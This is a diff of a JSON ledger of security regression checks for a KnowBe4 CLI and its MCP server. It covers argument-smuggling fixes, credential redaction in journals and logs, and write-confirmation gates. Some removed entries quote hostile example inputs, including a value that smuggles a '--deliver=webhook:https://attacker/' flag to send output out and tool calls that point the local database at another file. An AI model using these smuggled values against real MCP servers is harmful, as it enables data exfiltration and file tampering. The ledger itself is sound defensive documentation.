@@ -23,19 +23,17 @@
   },
   {
    "id": "import-uses-main-key-not-event-key",
-   "summary": "`import` is a write but uses the MAIN Reporting key (flags.newClient), NOT the secondary User Event key; docs attribute keys per-write",
+   "summary": "`import` is a write but uses the MAIN Reporting key (flags.newClient), NOT the secondary User Event key; docs attribute keys per-write (4.34.2 renders no `import` for the all-GET Reporting spec; restated as: no Reporting key source reads the User Event key)",
    "why": "The natural-but-wrong mental model is 'the events sub-product is the write surface, so all writes use the events key.' FALSE: `import` is a bulk POST write that uses the MAIN Reporting key (import.go calls flags.newClient(), the primary client) - only `events create`/`events delete` use the secondary key. Two adversarial rounds were needed to get the docs right (README + SKILL.md both initially mis-attributed). The governance Write row must keep `import` attributed to the main key (no secondary-key note) while `events create` notes it needs KNOWBE4_USER_EVENT_API_KEY.",
    "status": "active",
    "asserts": [
     {
-     "file": "cli/internal/cli/import.go",
-     "contains": "flags.newClient()",
-     "min_count": 1
+     "file": "cli/internal/config/config.go",
+     "not_contains": "KNOWBE4_USER_EVENT_API_KEY"
     },
     {
      "file": "governance.md",
-     "contains": "`events create` (push a custom risk event; needs `KNOWBE4_USER_EVENT_API_KEY`), `import`",
-     "min_count": 1
+     "contains": "`events create` (push a custom risk event; needs `KNOWBE4_USER_EVENT_API_KEY`)"
     }
    ]
   },
@@ -50,16 +48,12 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
      "file": "cli/internal/cli/doctor.go",
      "contains": "doctorIsInfoKey(k)"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
     },
     {
      "file": "cli/internal/cli/doctor.go",
@@ -72,6 +66,48 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorUnexpectedStatus(authAPIErr.StatusCode, verifyPath, report)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(doctorBase)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedTemplate(doctorBase)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedTemplate(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -145,360 +181,711 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
    "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name, and no file stores operator-named text that repeats a credential the program holds; applied by tools/maintainer/apply_journal_hardening.py. The <PREFIX>_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>:\" plus the typed name's hash when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. cliutil.RefuseHeld compares each operator-named write with every credential the secret funnel holds, in every view it decodes, and refuses a match before it is written: profiles.json, the journal, teach.log, learnings.jsonl, feedback.jsonl and the learn tables (learnings, playbooks, candidates, recall misses, entity aliases, patterns). journal_credential_hardening_test.go drives each path and fails if a credential reaches any file under the test home.",
+   "why": "Press 4.34.0 and 4.34.2 (learn/journal.go.tmpl) return the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and record every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query; and a credential given as a profile name or description, a recall or teach query or operand, or feedback is stored as typed. Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; operator-named text that repeats no credential the process holds is a name and is kept. A reprint that drops these edits fails these asserts and TestJournalCredentialHardening; re-run tools/maintainer/apply_journal_hardening.py --slug <slug>.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments; and every template that stores operator-named text should refuse one that repeats a held credential.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\treturn \"o:\" + hashHarnessSession(v)\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). The hand-written User Event API client (internal/userevents) funnels its HTTP error body and its rate-limit error body with the API key it sent. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/userevents/userevents.go",
-     "contains": "cliutil.FunnelWithhold(strings.TrimSpace(string(data)), []string{c.apiKey}))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/userevents/userevents.go",
-     "contains": "Body: cliutil.FunnelWithhold(string(data), []string{c.apiKey})}",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\tif entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "\tlookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}\n\tisBoolFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && f.Value.Type() == \"bool\"\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/cmd/knowbe4-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\tisDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}\n\tlearn.JournalInvocation(learn.JournalEntry{",
      "code_only": true
     },
     {
-     "file": "cli/cmd/knowbe4-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\t\tCmd:           journalVerbChain(rootCmd, executed),\n\t\tArgvShape:     learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
      "code_only": true
     },
     {
-     "file": "cli/cmd/knowbe4-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalHardeningStartupOverride(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalFailedFlagIdentity(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "no-response-cache",
+   "class": "secret-echo",
+   "summary": "The on-disk response cache is off on every client: raw Domotz bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (domotz_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to domotz from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Domotz state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/domotz_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to domotz from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
